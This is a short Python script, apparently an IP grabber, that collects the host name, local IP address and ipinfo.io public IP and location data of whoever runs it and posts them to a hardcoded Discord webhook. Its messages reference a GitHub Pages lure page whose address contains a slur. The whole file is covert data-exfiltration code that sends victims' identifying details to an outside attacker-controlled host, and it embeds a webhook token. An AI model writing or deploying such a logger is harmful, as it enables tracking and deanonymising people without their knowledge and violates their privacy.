import requests
import socket

Host=socket.gethostname()
IP=socket.gethostbyname(Host)
response=requests.get("https://ipinfo.io/json")
from discord_webhook import DiscordEmbed, DiscordWebhook
message="Private IP (IPV4) Address : " + IP, "\nHost Name :" + Host, f"\n{response.content}"
content="Logged someone from https://ilovenlggers.github.io/ShaneGEGMeeting/"
webhook=DiscordWebhook('https://discord.com/api/webhooks/1277397464458067998/plDqbvj-gla7MeG-HLq4vxd4Q6378tLcFimlAECAB_faiwqzrJf-76RW_hTkoTu87tkS')
embed=DiscordEmbed(title="ShaneGEG Logged from https://ilovenlggers.github.io/ShaneGEGMeeting/", description="Private IP (IPV4) Address : " + IP + "\nHost Name :" + Host + f"\n{response.content}", color=432242)
webhook.add_embed(embed=embed)
responzc=webhook.execute(content)
